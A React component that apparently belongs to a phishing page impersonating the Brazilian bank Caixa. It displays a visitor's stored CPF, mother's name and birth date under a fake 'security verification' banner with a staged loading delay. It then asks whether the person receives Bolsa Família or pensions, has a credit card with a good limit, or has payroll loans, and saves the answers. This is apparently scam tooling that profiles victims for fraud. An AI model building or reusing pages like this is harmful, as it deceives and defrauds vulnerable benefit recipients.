import { useState, useEffect } from "react";
import { AiOutlineCalendar, AiOutlineUser } from "react-icons/ai";
import logo from "../assets/caixa.webp";
import { BiCard } from "react-icons/bi";
import { GiFemale } from "react-icons/gi";
import { FaSpinner } from "react-icons/fa";
import Modal from "react-modal";
import { TbLockExclamation } from "react-icons/tb";
import logocaixa from "../assets/unnamed.png"

// Estilo do Modal
const modalStyles: Modal.Styles = {
    content: {
        top: "50%",
        left: "50%",
        right: "auto",
        bottom: "auto",
        marginRight: "-50%",
        transform: "translate(-50%, -50%)",
        padding: "2rem",
        borderRadius: "12px",
        boxShadow: "0 4px 20px rgba(0, 0, 0, 0.2)",
        maxWidth: "90%",
        width: "400px",
        border: "none",
    },
    overlay: {
        backgroundColor: "rgba(0, 0, 0, 0.5)",
        padding: "20px",
    },
};

Modal.setAppElement("#root"); // Acessibilidade para o Modal

export function Perguntas() {
    const [loadingData, setLoadingData] = useState(true);
    const [, setStartQuestions] = useState(false);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [currentQuestion, setCurrentQuestion] = useState(0);
    const [responses, setResponses] = useState({});

    const questions = [
        "Você já recebe o Bolsa Família ou algum outro benefício social do governo?",
        "Já optou pelo Saque-Aniversário do FGTS?",
        "Possui algum cartão de crédito ativo que possui bom limite?",
        "Atualmente possui empréstimos consignados?",
        "Está com o nome negativado (restrição de crédito no SPC/Serasa)?",
        "Recebe algum tipo de auxílio previdenciário, como auxílio-doença ou aposentadoria?",
    ];

    const [userData, setUserData] = useState({
        nome: "Usuário",
        cpf: "",
        dataNascimento: "",
        nomeMae: "",
    });

    // Simulação do carregamento dos dados
    useEffect(() => {
        setTimeout(() => {
            const storedUserData = localStorage.getItem("userData");
            if (storedUserData) {
                setUserData(JSON.parse(storedUserData));
            }
            setLoadingData(false);
        }, 4000);
    }, []);

    // Função para iniciar o questionário e abrir o modal
    const startQuestionnaire = () => {
        setStartQuestions(true);
        setIsModalOpen(true);
    };

    // Função para salvar a resposta e avançar para a próxima pergunta
    const handleResponse = (answer: unknown) => {
        const updatedResponses = { ...responses, [questions[currentQuestion]]: answer };
        setResponses(updatedResponses);
        localStorage.setItem("questionnaireResponses", JSON.stringify(updatedResponses));

        if (currentQuestion < questions.length - 1) {
            setCurrentQuestion(currentQuestion + 1);
        } else {
            alert("Verificação concluída com sucesso!");
            setIsModalOpen(false);
            setStartQuestions(false);
        }
    };

    return (
        <div className="w-screen h-screen flex flex-col items-center px-6 space-y-5 mt-6">
            <header className="flex flex-col items-center p-4 space-y-3">
                <img width={170} src={logo} alt="logo" />
                <span className="text-blue-800">Seja bem vindo {userData.nome.split(" ")[0]}</span>
            </header>

            <div className="text-center">
                <h2 className="text-lg text-zinc-500 mb-2">Precisamos confirmar seus dados...</h2>
                <p className="text-sm text-zinc-400">
                    Etapa de segurança do sistema
                </p>
            </div>

            <div className="w-full mt-6">
                {loadingData ? (
                    <div className="space-y-2">
                        <div className="h-6 bg-gray-300 rounded w-3/4 animate-pulse"></div>
                        <div className="h-6 bg-gray-300 rounded w-1/2 animate-pulse"></div>
                        <div className="h-6 bg-gray-300 rounded w-2/3 animate-pulse"></div>
                    </div>
                ) : (
                    <div className="space-y-2 text-left">
                        <div className="flex items-center space-x-2">
                            <AiOutlineUser size={18} />
                            <input
                                type="text"
                                value={userData?.nome}
                                className="border-b border-b-orange-500 w-full text-lg outline-none"
                                readOnly
                            />
                        </div>
                        <div className="flex items-center space-x-2">
                            <BiCard size={18} />
                            <input
                                type="text"
                                value={userData?.cpf}
                                className="border-b border-b-orange-500 w-full text-lg outline-none"
                                readOnly
                            />
                        </div>
                        {userData?.nomeMae && (
                            <div className="flex items-center space-x-2">
                                <GiFemale size={18} />
                                <input
                                    type="text"
                                    value={userData?.nomeMae}
                                    className="border-b border-b-orange-500 w-full text-lg outline-none"
                                    readOnly
                                />
                            </div>
                        )}
                        <div className="flex items-center space-x-2">
                            <AiOutlineCalendar size={18} />
                            <input
                                type="text"
                                value={userData?.dataNascimento}
                                className="border-b border-b-orange-500 w-full text-lg outline-none"
                                readOnly
                            />
                        </div>
                    </div>
                )}

                <div className="flex flex-col space-y-4 mt-6">
                    {loadingData ? (
                        <button
                            className="w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 bg-zinc-400 hover:bg-zinc-300"
                        >
                            <FaSpinner className="animate-spin mr-2" />
                            Carregando
                        </button>
                    ) : (
                        <button
                            onClick={startQuestionnaire}
                            className="w-full text-white rounded-sm flex items-center justify-center h-10 transition-transform duration-150 bg-orange-500 hover:bg-orange-400"
                        >
                            Confirmar dados
                        </button>
                    )}
                </div>
            </div>

            {/* Modal para as Perguntas de Verificação de Segurança */}
            <Modal
                isOpen={isModalOpen}
                onRequestClose={() => setIsModalOpen(false)}
                style={modalStyles}
                contentLabel="Verificação de Segurança"
            >

                <div className="w-full flex justify-center mb-6">
                    <img src={logocaixa} alt="logg" width={100} />

                </div>
                <div className="text-center">
                    <div className="flex items-center">
                        <TbLockExclamation className="text-orange-500 text-xl" />
                        <h2 className="text-xl font-bold">Verificação de Segurança</h2>
                    </div>
                    <p className="text-lg text-zinc-500 mb-2">
                        Etapa {currentQuestion + 1} de {questions.length}
                    </p>
                    <p className="text-lg text-zinc-700 mb-4">{questions[currentQuestion]}</p>

                    <div className="flex flex-col w-full justify-center mt-4 space-y-3">
                        <button
                            onClick={() => handleResponse("Sim")}
                            className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 w-full"
                        >
                            Sim
                        </button>
                        <button
                            onClick={() => handleResponse("Não")}
                            className="px-4 py-2 border border-primary  text-primary rounded-md  w-full"
                        >
                            Não
                        </button>
                    </div>

                </div>
            </Modal>
        </div>
    );
}
